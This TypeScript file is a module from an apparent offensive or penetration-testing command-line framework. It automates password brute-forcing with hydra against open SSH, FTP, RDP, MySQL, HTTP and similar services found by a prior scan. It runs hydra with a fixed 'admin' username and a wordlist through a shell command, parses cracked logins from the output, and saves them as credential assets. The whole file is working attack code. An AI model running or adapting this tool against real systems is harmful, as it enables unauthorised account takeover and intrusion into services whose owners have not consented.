// @ts-nocheck
// ============================================================================
// SECTION 1: Imports
// ============================================================================
import { UI, COLOR_PALETTE } from "../../lib/ui";
import { MissionManifest, ModuleResult, PortInfo } from "../../lib/types";

// ============================================================================
// SECTION 2: Module Metadata
// ============================================================================
export const meta = {
  name: "bruteforce",
  command: "bruteforce",
  description: "Password bruteforce with hydra against open services",
  requires: ["scanner"],
  inputs: ["ip", "ports"],
  outputs: ["credentials"],
};

// ============================================================================
// SECTION 3: Constants
// ============================================================================
const BRUTABLE_SERVICES = ["ssh", "ftp", "http", "https", "imap", "smtp", "pop3", "telnet", "rdp", "mysql"];

// ============================================================================
// SECTION 4: Helper Functions
// ============================================================================

function toHydraProtocol(service: string): string | null {
  const svc = service.toLowerCase();
  if (svc.includes("ssh")) return "ssh";
  if (svc.includes("ftp")) return "ftp";
  if (svc.includes("telnet")) return "telnet";
  if (svc.includes("imap")) return "imap";
  if (svc.includes("pop3")) return "pop3";
  if (svc.includes("smtp")) return "smtp";
  if (svc.includes("rdp") || svc.includes("microsoft-ds")) return "rdp";
  if (svc.includes("mysql")) return "mysql";
  if (svc.includes("https")) return "https-get";
  if (svc.includes("http")) return "http-get";
  return null;
}

function getBrutablePorts(ports: PortInfo[]): PortInfo[] {
  return ports.filter(p => 
    p.state === "open" && 
    BRUTABLE_SERVICES.some(s => p.service.toLowerCase().includes(s))
  );
}

function resolveTargets(mission: MissionManifest, args?: string[]): string[] {
  if (args && args.length > 0) {
    return args.filter(ip => mission.assets.ips.some(a => a.value === ip));
  }
  return mission.assets.ips
    .filter(ip => ip.status === "scanned" && ip.ports.length > 0)
    .map(ip => ip.value);
}

// ============================================================================
// SECTION 5: Core Logic
// ============================================================================

export async function run(
  mission: MissionManifest,
  ui: UI,
  args?: string[]
): Promise<ModuleResult> {
  const targets = resolveTargets(mission, args);

  if (targets.length === 0) {
    ui.error("No target IP with scanned ports found");
    ui.info("Run: nine scan <ip> first, or specify a valid IP");
    return { success: false, data: { error: "No target with ports" } };
  }

  const allCredentials: Array<{ user: string; pass: string; service: string; ip: string; port: number }> = [];
  const wordlist = "wordlist.lst";
  const username = "admin";

  ui.section("BRUTEFORCE");
  ui.print("Wordlist", wordlist, { label: COLOR_PALETTE.white, value: COLOR_PALETTE.cyan });
  ui.print("Username", username, { label: COLOR_PALETTE.white, value: COLOR_PALETTE.cyan });
  ui.divider();

  for (const target of targets) {
    const ipAsset = mission.assets.ips.find(ip => ip.value === target);
    if (!ipAsset || ipAsset.ports.length === 0) {
      ui.warn(`No ports found for ${target} - skipping`);
      continue;
    }

    const brutablePorts = getBrutablePorts(ipAsset.ports);
    if (brutablePorts.length === 0) {
      ui.warn(`No bruteforce-able services on ${target}`);
      continue;
    }

    ui.print("Target", target, { label: COLOR_PALETTE.white, value: COLOR_PALETTE.pink });
    ui.info(`Found ${brutablePorts.length} bruteforce-able service(s)`);

    for (const port of brutablePorts) {
      const protocol = toHydraProtocol(port.service);
      if (!protocol) {
        ui.warn(`Cannot map ${port.service} to hydra protocol - skipping`);
        continue;
      }

      ui.divider();
      ui.print("Service", port.service, { label: COLOR_PALETTE.white, value: COLOR_PALETTE.cyan });
      ui.print("Port", String(port.port), { label: COLOR_PALETTE.white, value: COLOR_PALETTE.purple });
      ui.print("Protocol", protocol, { label: COLOR_PALETTE.white, value: COLOR_PALETTE.cyan });
      ui.divider();

      const tmpFile = "./tmp/hydra_output.txt";
      await FileSystem.Mkdir("./tmp", { recursive: true });

      try {
        ui.info(`Running hydra - this may take a while...`);
        await Shell.Process.exec(`hydra -l ${username} -P ${wordlist} -s ${port.port} ${target} ${protocol} > ${tmpFile}`);
        
        const output = await FileSystem.ReadFile(tmpFile, { absolute: false });
        
        // Parse hydra output for successful credentials
        // Pattern: [PROTOCOL][host] login: username password: password
        const credMatch = output.match(/login:\s*(\S+)\s+password:\s*(\S+)/);
        if (credMatch) {
          const foundUser = credMatch[1];
          const foundPass = credMatch[2];
          
          ui.success(`Credentials found!`);
          ui.print("User", foundUser, { label: COLOR_PALETTE.white, value: COLOR_PALETTE.green });
          ui.print("Pass", foundPass, { label: COLOR_PALETTE.white, value: COLOR_PALETTE.green });
          
          allCredentials.push({
            user: foundUser,
            pass: foundPass,
            service: port.service,
            ip: target,
            port: port.port,
          });
        } else {
          ui.warn("No credentials found for this service");
        }

        // Cleanup
        await FileSystem.Remove(tmpFile, { absolute: false }).catch(() => {});
      } catch (err) {
        ui.error(`Hydra failed: ${err}`);
        // Cleanup on error
        await FileSystem.Remove(tmpFile, { absolute: false }).catch(() => {});
      }
    }
  }

  ui.divider();
  if (allCredentials.length > 0) {
    ui.success(`Bruteforce complete - found ${allCredentials.length} credential(s)`);
  } else {
    ui.warn("Bruteforce complete - no credentials found");
  }

  // Build newAssets for credentials
  const newAssets = allCredentials.map(cred => ({
    type: "credential" as const,
    value: { user: cred.user, pass: cred.pass, source: `bruteforce-${cred.service}` },
    parent: cred.ip,
  }));

  return {
    success: allCredentials.length > 0,
    data: { 
      credentials: allCredentials,
      count: allCredentials.length 
    },
    newAssets,
  };
}

// ============================================================================
// SECTION 6: Default Export
// ============================================================================
export default { meta, run };
